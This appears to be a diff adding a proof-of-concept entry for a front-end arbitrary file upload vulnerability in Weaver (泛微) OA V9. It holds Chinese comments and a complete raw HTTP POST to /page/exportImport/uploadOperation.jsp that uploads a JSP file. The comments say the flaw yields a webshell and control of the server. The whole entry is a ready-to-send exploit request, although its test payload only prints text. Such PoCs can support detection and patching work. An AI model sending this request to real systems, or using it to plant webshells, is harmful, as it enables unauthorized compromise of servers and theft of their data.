@@ -1,0 +1,16 @@
+# 泛微OA V9 uploadOperation 前台任意文件上传漏洞
+# 泛微OA V9 uploadOperation 前台任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。
+POST /page/exportImport/uploadOperation.jsp?acid=80025426&bid=hd_tag_m8mv260d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260d
+RM-PRO-Token: 7c84228df5e4539da76151ebbeac8a4f
+RM-PRO-Time: 1742808519545
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="test.jsp"
+Content-Type: application/octet-stream
+
+<% out.println("test");%>
+------WebKitFormBoundary--
